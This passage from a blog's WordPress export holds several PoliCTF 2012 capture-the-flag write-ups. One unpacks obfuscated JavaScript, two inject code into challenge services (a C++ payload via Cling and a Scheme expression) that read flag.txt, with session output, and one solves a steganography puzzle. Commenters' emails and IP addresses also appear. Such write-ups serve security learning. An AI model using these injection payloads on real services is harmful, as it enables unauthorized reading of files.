at org.mozilla.javascript.DToA.d2b(DToA.java:203)
at org.mozilla.javascript.DToA.JS_dtoa(DToA.java:558)
...
js: exception from uncaught JavaScript throw: java.lang.StackOverflowError
[/shell]

Looks like we get a StackOverflowError. Something is wrong with the code. Take a look at the (first) definition for the function e.

[javascript]
e = function (duckrolled) {
return (c &lt; a ? '' : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))
};
[/javascript]

<em>duckrolled</em> looks totally wrong. The variable is completely unused within the function. Looking back at the previous packers, this parameter is <em>c</em>! That's why the StackOverflowError is occurring, it's because <em>c</em> isn't properly set. Replace <em>duckrolled</em> with <em>c</em> and we should be set.

We pretty much hate obfuscated packed code so let's unpack this.

[javascript]
var key = "";
var hexcase = 0;
key += "0xB1";

function hex_sha1(a) {
return rstr2hex(rstr_sha1(str2rstr_utf8(a)))
}
function hex_hmac_sha1(a, b) {
return rstr2hex(rstr_hmac_sha1(str2rstr_utf8(a), str2rstr_utf8(b)))
}
function sha1_vm_test() {
return hex_sha1("abc").toLowerCase() == "900150983cd24fb0d6963f7d28e17f72"
}
function rstr_sha1(a) {
return binl2rstr(binl_sha1(rstr2binl(a), a.length * 8))
}
function rstr_hmac_sha1(c, f) {
var e = rstr2binl(c);
if (e.length &gt; 16) {
e = binl_sha1(e, c.length * 8)
}
var a = Arrray(16),
d = Arrray(16);
for (var b = 0; b &lt; 16; b++) {
a[b] = e[b] ^ 909522486;
d[b] = e[b] ^ 1549556828
}
var g = binl_sha1(a.concat(rstr2binl(f)), 512 + f.length * 8);
return binl2rstr(binl_sha1(d.concat(g), 512 + 128))
}
function rstr2hex(c) {
try {
hexcase
} catch (g) {
hexcase = 0
}
var f = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
var b = "";
var a;
for (var d = 0; d &lt; c.length; d++) {
a = c.charCodeAt(d);
b += f.charAt((a &gt;&gt;&gt; 4) &amp; 15) + f.charAt(a &amp; 15)
}
return b
}
function str2rstr_utf8(c) {
var b = "";
var d = -1;
var a, e;
while (++d &lt; c.length) {
a = c.charCodeAt(d);
e = d + 1 &lt; c.length ? c.charCodeAt(d + 1) : 0;
if (55296 a = 65536 + ((a &amp; 1023) &lt;&lt; 10) + (e &amp; 1023);
d++
}
if (a b += String.fromCharCode(a)
} else {
if (a b += String.fromCharCode(192 | ((a &gt;&gt;&gt; 6) &amp; 31), 128 | (a &amp; 63))
} else {
if (a b += String.fromCharCode(224 | ((a &gt;&gt;&gt; 12) &amp; 15), 128 | ((a &gt;&gt;&gt; 6) &amp; 63), 128 | (a &amp; 63))
} else {
if (a b += String.fromCharCode(240 | ((a &gt;&gt;&gt; 18) &amp; 7), 128 | ((a &gt;&gt;&gt; 12) &amp; 63), 128 | ((a &gt;&gt;&gt; 6) &amp; 63), 128 | (a &amp; 63))
}
}
}
}
}
return b
}
function rstr2binl(b) {
var a = Arrray(b.length &gt;&gt; 2);
for (var c = 0; c &lt; a.length; c++) {
a[c] = 0
}
for (var c = 0; c &lt; b.length * 8; c += 8) {
a[c &gt;&gt; 5] |= (b.charCodeAt(c / 8) &amp; 255) &lt;&lt; (c % 32)
}
return a
}
function binl2rstr(b) {
var a = "";
for (var c = 0; c &lt; b.length * 32; c += 8) {
a += String.fromCharCode((b[c &gt;&gt; 5] &gt;&gt;&gt; (c % 32)) &amp; 255)
}
return a
};
key += "4B0";

function binl_sha1(p, k) {
p[k &gt;&gt; 5] |= 128 &lt;&lt; ((k) % 32);
p[(((k + 64) &gt;&gt;&gt; 9) &lt;&lt; 4) + 14] = k;
var o = 1732584193;
var n = -271733879;
var m = -1732584194;
var l = 271733878;
for (var g = 0; g &lt; p.length; g += 16) {
var j = o;
var h = n;
var f = m;
var e = l;
o = sha1_ff(o, n, m, l, p[g + 0], 7, -680876936);
l = sha1_ff(l, o, n, m, p[g + 1], 12, -389564586);
m = sha1_ff(m, l, o, n, p[g + 2], 17, 606105819);
n = sha1_ff(n, m, l, o, p[g + 3], 22, -1044525330);
o = sha1_ff(o, n, m, l, p[g + 4], 7, -176418897);
l = sha1_ff(l, o, n, m, p[g + 5], 12, 1200080426);
m = sha1_ff(m, l, o, n, p[g + 6], 17, -1473231341);
n = sha1_ff(n, m, l, o, p[g + 7], 22, -45705983);
o = sha1_ff(o, n, m, l, p[g + 8], 7, 1770035416);
l = sha1_ff(l, o, n, m, p[g + 9], 12, -1958414417);
m = sha1_ff(m, l, o, n, p[g + 10], 17, -42063);
n = sha1_ff(n, m, l, o, p[g + 11], 22, -1990404162);
o = sha1_ff(o, n, m, l, p[g + 12], 7, 1804603682);
l = sha1_ff(l, o, n, m, p[g + 13], 12, -40341101);
m = sha1_ff(m, l, o, n, p[g + 14], 17, -1502002290);
n = sha1_ff(n, m, l, o, p[g + 15], 22, 1236535329);
o = sha1_gg(o, n, m, l, p[g + 1], 5, -165796510);
l = sha1_gg(l, o, n, m, p[g + 6], 9, -1069501632);
m = sha1_gg(m, l, o, n, p[g + 11], 14, 643717713);
n = sha1_gg(n, m, l, o, p[g + 0], 20, -373897302);
o = sha1_gg(o, n, m, l, p[g + 5], 5, -701558691);
l = sha1_gg(l, o, n, m, p[g + 10], 9, 38016083);
m = sha1_gg(m, l, o, n, p[g + 15], 14, -660478335);
n = sha1_gg(n, m, l, o, p[g + 4], 20, -405537848);
o = sha1_gg(o, n, m, l, p[g + 9], 5, 568446438);
l = sha1_gg(l, o, n, m, p[g + 14], 9, -1019803690);
m = sha1_gg(m, l, o, n, p[g + 3], 14, -187363961);
n = sha1_gg(n, m, l, o, p[g + 8], 20, 1163531501);
o = sha1_gg(o, n, m, l, p[g + 13], 5, -1444681467);
l = sha1_gg(l, o, n, m, p[g + 2], 9, -51403784);
m = sha1_gg(m, l, o, n, p[g + 7], 14, 1735328473);
n = sha1_gg(n, m, l, o, p[g + 12], 20, -1926607734);
o = sha1_hh(o, n, m, l, p[g + 5], 4, -378558);
l = sha1_hh(l, o, n, m, p[g + 8], 11, -2022574463);
m = sha1_hh(m, l, o, n, p[g + 11], 16, 1839030562);
n = sha1_hh(n, m, l, o, p[g + 14], 23, -35309556);
o = sha1_hh(o, n, m, l, p[g + 1], 4, -1530992060);
l = sha1_hh(l, o, n, m, p[g + 4], 11, 1272893353);
m = sha1_hh(m, l, o, n, p[g + 7], 16, -155497632);
n = sha1_hh(n, m, l, o, p[g + 10], 23, -1094730640);
o = sha1_hh(o, n, m, l, p[g + 13], 4, 681279174);
l = sha1_hh(l, o, n, m, p[g + 0], 11, -358537222);
m = sha1_hh(m, l, o, n, p[g + 3], 16, -722521979);
n = sha1_hh(n, m, l, o, p[g + 6], 23, 76029189);
o = sha1_hh(o, n, m, l, p[g + 9], 4, -640364487);
l = sha1_hh(l, o, n, m, p[g + 12], 11, -421815835);
m = sha1_hh(m, l, o, n, p[g + 15], 16, 530742520);
n = sha1_hh(n, m, l, o, p[g + 2], 23, -995338651);
o = sha1_ii(o, n, m, l, p[g + 0], 6, -198630844);
l = sha1_ii(l, o, n, m, p[g + 7], 10, 1126891415);
m = sha1_ii(m, l, o, n, p[g + 14], 15, -1416354905);
n = sha1_ii(n, m, l, o, p[g + 5], 21, -57434055);
o = sha1_ii(o, n, m, l, p[g + 12], 6, 1700485571);
l = sha1_ii(l, o, n, m, p[g + 3], 10, -1894986606);
m = sha1_ii(m, l, o, n, p[g + 10], 15, -1051523);
n = sha1_ii(n, m, l, o, p[g + 1], 21, -2054922799);
o = sha1_ii(o, n, m, l, p[g + 8], 6, 1873313359);
l = sha1_ii(l, o, n, m, p[g + 15], 10, -30611744);
m = sha1_ii(m, l, o, n, p[g + 6], 15, -1560198380);
n = sha1_ii(n, m, l, o, p[g + 13], 21, 1309151649);
o = sha1_ii(o, n, m, l, p[g + 4], 6, -145523070);
l = sha1_ii(l, o, n, m, p[g + 11], 10, -1120210379);
m = sha1_ii(m, l, o, n, p[g + 2], 15, 718787259);
n = sha1_ii(n, m, l, o, p[g + 9], 21, -343485551);
o = safe_add(o, j);
n = safe_add(n, h);
m = safe_add(m, f);
l = safe_add(l, e)
}
return Arrray(o, n, m, l)
}
function sha1_cmn(h, e, d, c, g, f) {
return safe_add(bit_rol(safe_add(safe_add(e, h), safe_add(c, f)), g), d)
};
key += "OB5";

function sha1_ff(g, f, k, j, e, i, h) {
return sha1_cmn((f &amp; k) | ((~f) &amp; j), g, f, e, i, h)
}
function sha1_gg(g, f, k, j, e, i, h) {
return sha1_cmn((f &amp; j) | (k &amp; (~j)), g, f, e, i, h)
}
function sha1_hh(g, f, k, j, e, i, h) {
return sha1_cmn(f ^ k ^ j, g, f, e, i, h)
}
function sha1_ii(g, f, k, j, e, i, h) {
return sha1_cmn(k ^ (f | (~j)), g, f, e, i, h)
}
function safe_add(a, d) {
var c = (a &amp; 65535) + (d &amp; 65535);
var b = (a &gt;&gt; 16) + (d &gt;&gt; 16) + (c &gt;&gt; 16);
return (b &lt;&lt; 16) | (c &amp; 65535)
};

function bit_rol(a, b) {
return (a &lt;&lt; b) | (a &gt;&gt;&gt; (32 - b))
};
key1 = key;
key = hex_sha1(key1);

function duckrolled(a, b) {
return (a &lt;&lt; b) | (a &gt;&gt;&gt; (32 - b))
};
document.write(key);
[/javascript]

Great, we've got something that writes us the key. Replace document.write(key) with print and lets run. However, running this yields:

[shell]
amon@Alyx:~/polictf/grabbag300$ rhino unpack4.js
js: uncaught JavaScript runtime exception: ReferenceError: "Arrray" is not defined.
[/shell]

Derp. Just replace Arrray with Array and run again:

[shell]
amon@Alyx:~/polictf/grabbag300$ rhino unpack4.js
69454623829323481e291a32e7b40aa0
[/shell]

And we got our flag :D

<strong>Flag: 69454623829323481e291a32e7b40aa0</strong>

Addendum: Apparently hex_sha1() is an MD5 hash generator (admiral0, the author, in comments below). Sneaky!]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>234</wp:post_id>
		<wp:post_date>2012-11-19 14:38:48</wp:post_date>
		<wp:post_date_gmt>2012-11-19 06:38:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>polictf-2012-grab-bag-300</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="polictf"><![CDATA[polictf]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>11</wp:comment_id>
			<wp:comment_author><![CDATA[admiral0]]></wp:comment_author>
			<wp:comment_author_email>rda1988@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>131.175.28.130</wp:comment_author_IP>
			<wp:comment_date>2012-11-19 17:28:25</wp:comment_date>
			<wp:comment_date_gmt>2012-11-19 09:28:25</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I'm the author of this. Hope you liked it.

I'll add a little detail. Obviously hex_sha1() is generating an md5 hash.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>12</wp:comment_id>
			<wp:comment_author><![CDATA[amon]]></wp:comment_author>
			<wp:comment_author_email>jergorn93@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>164.78.248.244</wp:comment_author_IP>
			<wp:comment_date>2012-11-19 17:59:36</wp:comment_date>
			<wp:comment_date_gmt>2012-11-19 09:59:36</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:P It's a pretty sweet challenge, yeah. Thanks for the CTF!

I didn't actually pick up on that, heh. Solved it with I think an hour left and at 3am in the morning. Sweet little tidbit there.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>11</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>PoliCTF 2012 - Bin-Pwn 400</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-bin-pwn-400/</link>
		<pubDate>Mon, 19 Nov 2012 07:18:41 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=247</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Alien Technologies.

challenge@alien.challenges.polictf.it:16000</blockquote>
In this challenge, we had to exploit a binary that was run once a user logged into the server through SSH. The binary was basically an REPL that communicated with the user in Klingon to calculate means, variances, and the result of a custom operation on a list of numbers. It is vulnerable to code injection when a user supplied formula is run in the C++ interpreter (Cling).<!--more-->

[shell]
amon@Alyx:~/stuff$ ssh -p 16000 -i id_rsa challenge@alien.challenges.polictf.it
loS ..........
ghItlh pIqaD (a..y)
a
Hutlh
ghItlh pIqaD (a..y)
b
Hutlh
ghItlh pIqaD (a..y)
c
Qagh ghItlhqa'
d
Qagh ghItlhqa'
quit
Qagh ghItlhqa'
Dor
Connection to alien.challenges.polictf.it closed.
amon@Alyx:~/stuff$
[/shell]

The first step was to identify the language in which the text was relayed. It was found that the above was Klingon. So let's translate a few phrases:
<ol>
	<li>loS - wait</li>
	<li>ghItlh pIqaD (a..y) - write Klingon (a..y)</li>
	<li>Hutlh - lack</li>
	<li>Dor - to end</li>
	<li>Qagh ghItlhqa' - mistake write again (qa' suffix affects re-doing)</li>
</ol>
Now, the (a..y) implies that we should try the Klingon alphabet from the a symbol to y symbol. So we obtained a copy of that:
<blockquote>a, b, ch, D, e, gh, H, I, j, l, m, n, ng, o, p, q, Q, r, S, t, tlh, u, v, w, y</blockquote>
Trying every letter:

[shell]
...
ch
ghItlh teywI' pong (main.cpp, ...)
...
gh
ghItlh De'
...
ng
ghItlh Qap
...
tlh
ghItlh Qap (0..3)
...
[/shell]
Translating this:
<ol>
	<li>ghItlh teywI' pong - write file name</li>
	<li>ghItlh De' - write it</li>
	<li>ghItlh Qap - write function</li>
</ol>
Sweet, looks like we can dump the source to the main.cpp, probably for the program, using the Klingon letter 'ch'. Now, if we look in main.cpp, we can see an include for prompt.h, and from there we may discover data.h. There must be a file implementing prompt.h too though, so prompt.cpp exists as well.

Here are the source files that are exposed:
<ol>
	<li><a href="https://github.com/nnamon/static-gordon/blob/master/polictf2012/binpwn400/main.cpp">main.cpp</a></li>
	<li><a href="https://github.com/nnamon/static-gordon/blob/master/polictf2012/binpwn400/prompt.h">prompt.h</a></li>
	<li><a href="https://github.com/nnamon/static-gordon/blob/master/polictf2012/binpwn400/prompt.cpp">prompt.cpp</a></li>
	<li><a href="https://github.com/nnamon/static-gordon/blob/master/polictf2012/binpwn400/data.h">data.h</a></li>
</ol>
From prompt.cpp, we can observe that the 'ch', 'gh', 'ng', and 'tlh' commands are mapped to functions which take input from the user:
<ol>
	<li>'ch' - dumps files, (only main.cpp, prompt.h, prompt.cpp, data.h, and not flag.txt)</li>
	<li>'gh' - adds a number to a list</li>
	<li>'ng' - replaces the third operation with a custom operator of your own</li>
	<li>'tlh' - calculates the mean, and variance of the data in the list and calculates the result of the operation presupplied by the system or provided by the user</li>
</ol>
At this point, we can hypothesize that perhaps, arbitrary code can be injected through the custom operation definition ('ng') and executed through the use of 'tlh'.

[cpp]
Prompt()
{
op[0]="result=mean+variance";
op[1]="result=mean+2*variance";
op[2]="result=mean+3*variance";
op[3]=";";
}
[/cpp]

Operations are in the form 'result=(operations)' which make use of variables 'mean' and 'variance'. Since C++ is a statically typed language, we can assume result is a float.

[cpp]
if(values.size()&lt;2)
{
cout&lt;&lt;"Qagh"&lt;&lt;endl;
return;
}]
[/cpp]

Now, we also can see that the list is required to contain, at minimum, 2 items.

Let's test it out.

[shell]
loS ..........
ghItlh pIqaD (a..y)
gh
ghItlh De'
1
ghItlh pIqaD (a..y)
gh
ghItlh De'
2
ghItlh pIqaD (a..y)
ng
ghItlh Qap
result=1337
ghItlh pIqaD (a..y)
tlh
ghItlh Qap (0..3)
3
1.5 0.5 1337
ghItlh pIqaD (a..y)
[/shell]

Awesome, now let's test if it's simply evaluating only numbers or we may perform our own arbitrary code.

[shell]
loS ..........
ghItlh pIqaD (a..y)
gh
ghItlh De'
1
ghItlh pIqaD (a..y)
gh
ghItlh De'
2
ghItlh pIqaD (a..y)
ng
ghItlh Qap
result=0; cout &lt;&lt; "hacked";
ghItlh pIqaD (a..y)
tlh
ghItlh Qap (0..3)
3
hacked1.5 0.5 0
ghItlh pIqaD (a..y)
[/shell]

Great, now all we have to do is read the file and print it to stdout. There is a constraint on our payload though.

[cpp]
if(check(newop) || newop.length()&gt;80) cout&lt;&lt;"Qagh"&lt;&lt;endl;
[/cpp]

It has to be 80 characters or less, so we came up with the following:

[cpp]
result=0;string l;ifstream f ("flag.txt");while(getline(f, l)) cout&lt;&lt;l&lt;&lt;"\n";
[/cpp]

Performing the attack:

[shell]
ghItlh pIqaD (a..y)
gh
ghItlh De'
1
ghItlh pIqaD (a..y)
gh
ghItlh De'
2
ghItlh pIqaD (a..y)
ng
ghItlh Qap
result=0;string l;ifstream f ("flag.txt");while(getline(f, l)) cout&lt;&lt;l&lt;&lt;"\n";
ghItlh pIqaD (a..y)
tlh
ghItlh Qap (0..3)
3
Well done, you found the flag:

jbvenvinvpek2envi2n

This challenge is powered by cling: http://root.cern.ch/drupal/content/cling
1.5 0.5 0
ghItlh pIqaD (a..y)
[/shell]

And we have our flag. Seriously cool challenge, no?

<strong>Flag: jbvenvinvpek2envi2n</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>247</wp:post_id>
		<wp:post_date>2012-11-19 15:18:41</wp:post_date>
		<wp:post_date_gmt>2012-11-19 07:18:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>polictf-2012-bin-pwn-400</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="polictf"><![CDATA[polictf]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>PoliCTF 2012 - Grab Bag 100</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-grab-bag-100/</link>
		<pubDate>Mon, 19 Nov 2012 06:59:18 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=248</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-032627.png"><img src="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-032627-1024x575.png" alt="" title="Screenshot at 2012-11-19 03:26:27" width="584" height="327" class="alignnone size-large wp-image-249" /></a>

<blockquote>
We need your help to hack the planet!!! Somehow we have lost a little chunck of the garbage file. We just need 4 byte starting from address 0x000020. Please help us!!!

(Hint: in hex, lowercase,without leading 0x)
</blockquote>

We didn't solve this one in time because amon is an _idiot_.

<strong>Flag: 3dc6032c</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>248</wp:post_id>
		<wp:post_date>2012-11-19 14:59:18</wp:post_date>
		<wp:post_date_gmt>2012-11-19 06:59:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>polictf-2012-grab-bag-100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="polictf"><![CDATA[polictf]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>PoliCTF 2012 - Bin-Pwn 200</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-bin-pwn-200/</link>
		<pubDate>Mon, 19 Nov 2012 07:46:00 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=255</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Play with this amazing calculator:
calc.challenges.polictf.it:4000</blockquote>
In this challenge, we had to blindly exploit a networked binary in a black box setting. The binary is a calculator that prompts the user for the first number, an operator, and the second number. If the operation was valid it will return the answer else it would hang there.

[shell]
amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:1337
Write the operator:+
Write the second number:1337
2674amon@Alyx:~$
[/shell]

<!--more-->1337 + 1337 = 2674, sure no problem there. However, some odd calculations we tried tipped us off to the true nature of the calculator.

[shell]
amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:1 1 1 1 1 1
Write the operator:+
Write the second number:1
7

amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:1 1 1 1 1 1
Write the operator:-
Write the second number:1
-5
[/shell]

1 1 1 1 1 1 + 1 looks weird and should fail but it doesnt. It even yields 7 which is 1 + 1 + 1 + 1 + 1 + 1 + 1. The subtraction operation yields an even weirder answer.

However, it was this operation that really revealed that the interpreter was Scheme.

[shell]
amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:1
Write the operator:&lt;
Write the second number:2
#t

amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:2
Write the operator:&lt;
Write the second number:1
#f
[/shell]

Sweet, #t and #f are values in Scheme representing True and False respectively. Now we can expect that the layout of user supplied values would be (operator first_number second_number) e.g. (+ 1 1). Now we understand how the input is passed to an interpreter, a Scheme interpreter, so let's craft our attack payload.

Objectives for our attack payload:
<ol>
	<li>List files on the disk</li>
	<li>Read from file</li>
</ol>
Listing files may be achieved by the (directory-list) function.
Reading from a file may be done by (read (open-input-file "filename").

Let's list the files in the current directory:

[shell]
amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:directory-list
Write the operator:
Write the second number:
(flag.txt challenge)
[/shell]

Great, let's read flag.txt.

[shell]
amon@Alyx:~$ nc calc.challenges.polictf.it 4000
Write the first number:read (open-input-file "flag.txt")
Write the operator:
Write the second number:
cb1228e2387cc12ad30fd4243fc23a0
[/shell]

Easy.

<strong>Flag: cb1228e2387cc12ad30fd4243fc23a0</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>255</wp:post_id>
		<wp:post_date>2012-11-19 15:46:00</wp:post_date>
		<wp:post_date_gmt>2012-11-19 07:46:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>polictf-2012-bin-pwn-200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="polictf"><![CDATA[polictf]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>PoliCTF 2012 - Bin-Pwn 100</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-bin-pwn-100/</link>
		<pubDate>Mon, 19 Nov 2012 08:23:56 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=259</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/11/org.jpeg"><img class="alignnone size-full wp-image-260" title="org" src="http://nandynarwhals.org/wp-content/uploads/2012/11/org.jpeg" alt="" width="640" height="480" /></a>
<blockquote>Retrieve the key.

Attachment:e159727a9475c11.tbz2.gpg (password: 05adc72b9da100f4e28c173ac87947a91ee99b2b )</blockquote>
Oh man, PoliCTF takes the cake for having steganography in every freaking puzzle. In the tar.gz package included in the tar.bzip2 package included in the GPG encrypted file, the following files were found:<!--more-->

[shell]
amon@Alyx:~/polictf/binpwn100$ tar tvfz umad.tar.gz
drwxrwxr-x fede/fede 0 2012-05-26 06:23 jpeg/
-rw-r--r-- fede/fede 1616 2012-05-26 06:23 jpeg/jconfig.h
-rw-r--r-- fede/fede 48569 2012-05-26 06:23 jpeg/jpeglib.h
-rw-r--r-- fede/fede 12558 2012-05-26 06:23 jpeg/jmorecfg.h
-rw-r--r-- fede/fede 14581 2012-05-26 06:23 jpeg/jerror.h
-rw-rw-r-- fede/fede 1446942 2012-08-08 22:11 libjpeg.a
-rw-rw-r-- fede/fede 56 2012-05-26 06:30 Makefile
-rw-rw-r-- fede/fede 3296 2012-05-26 16:51 umad.cpp
[/shell]

umad.cpp looks interesting. Examination of the file doesn't reveal anything though. So, let's compile and run this.

[shell]
amon@Alyx:~/umad$ make
g++ -o umad umad.cpp -L. -ljpeg
amon@Alyx:~/umad$ ./umad
Done
[/shell]

It outputs the image you see above. :/ Assholes.

So let's take a look at the rest of the files. libjpeg.a seems to be interesting. Strings indicate that this isn't your standard libjpeg.a distributed by your friendly Linux distribution.

[shell]
amon@Alyx:~/umad$ strings libjpeg.a | head -n 10
!
/ 1344435103 0 0 0 3688 `
jpeg_aritab
...
/home/haxor/Documents/coding/libraries/utilities/imaging/jpeg-8d
...
_vtable_offset
alloc_sarray
write_frame_header
[/shell]

An .ar file is simply an archive used by the linker, so let's print a list of files in it.

[shell]
amon@Alyx:~/polictf/binpwn100$ ar t libjpeg.a
jaricom.o
...
jcmarker.jpeg
...
jmemnobs.o
[/shell]

Why is there a .jpeg file in an .ar? A bi-winning jpeg of course. Extract and file it.

[shell]
amon@Alyx:~/polictf/binpwn100$ ar vx libjpeg.a jcmarker.jpeg
x - jcmarker.jpeg
amon@Alyx:~/polictf/binpwn100$ file jcmarker.jpeg
jcmarker.jpeg: POSIX shell script text executable
[/shell]

Cries of 'bullshit!' fill the air. However, it's just another case of stego though, and we can replace the '#!/bin/sh\x00' header with a proper jpeg header 'FF D8 FF E0 00 10 4A 46 49 46 00'.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/11/jcmarkerfixed.jpeg"><img class="alignnone size-full wp-image-265" title="jcmarkerfixed" src="http://nandynarwhals.org/wp-content/uploads/2012/11/jcmarkerfixed.jpeg" alt="" width="640" height="480" /></a>

<strong>Flag: 8d66668deee4964c2c429e2ae64ccc8667b5d911</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>259</wp:post_id>
		<wp:post_date>2012-11-19 16:23:56</wp:post_date>
		<wp:post_date_gmt>2012-11-19 08:23:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>polictf-2012-bin-pwn-100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="polictf"><![CDATA[polictf]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
</channel>
</rss>
